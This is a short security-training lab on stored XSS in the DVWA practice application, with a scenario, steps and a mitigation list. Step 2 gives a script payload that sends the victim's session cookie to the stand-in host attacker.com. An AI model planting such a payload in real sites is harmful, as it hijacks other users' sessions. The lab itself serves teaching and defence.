## 🔍 Lab 4: XSS – Session Hijacking in Internal Dashboard

### 💼 Scenario

A developer chat tool renders user input without output encoding. Stored XSS impacts all logged-in users.
### 🎯 Objective

Inject malicious JavaScript to hijack sessions or redirect users.
### 🧪 Steps

1. Access DVWA → XSS (Stored)
2. Submit message:

```html
<script>document.location='http://attacker.com?c='+document.cookie</script>
```

3. Visit page as another user → auto-redirect

### 🧠 Real-World Context

XSS is commonly exploited in chat tools, comments, and admin panels. It enables phishing, malware drops, and impersonation.

### 🛡️ Mitigation

- Use output encoding (e.g., OWASP Java Encoder).
- Apply Content Security Policy (CSP).
- Escape input on output.